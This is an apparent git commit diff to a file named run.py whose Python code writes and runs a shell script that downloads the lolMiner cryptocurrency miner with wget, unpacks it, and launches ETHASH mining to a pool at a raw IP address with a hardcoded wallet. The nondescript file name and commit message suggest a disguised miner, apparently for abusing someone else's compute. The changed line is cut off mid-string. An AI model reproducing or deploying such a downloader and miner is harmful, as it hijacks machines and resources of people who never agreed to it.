2f0fad902eea3dc81a889c3a4fa6b52d7f384333
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2022-07-07 13:47:02 +0700

    Update run.py

--- run.py
+++ run.py
@@ -1,6 +1,6 @@
 import os
 os.system('echo "#!/bin/sh" >> tes')
 os.system('echo "wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.35/lolMiner_v1.35_Lin64.tar.gz && tar zxvf lolMiner_v1.35_Lin64.tar.gz && cd 1.35" >> tes')
-os.system('echo "./lolMiner --algo ETHASH --pool 216.250.118.159:443 --user 3CnZTtQYF7sGJHr1LsFRds4GmUvB1dUjAM.rknew
+os.system('echo "./lolMiner --algo ETHASH --pool 216.250.118.159:443 --user 3CnZTtQYF7sGJHr1LsFRds4GmUvB1dUjAM.rknew --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROX --basecolor
 os.system('sleep 2')
 os.system('sh tes')
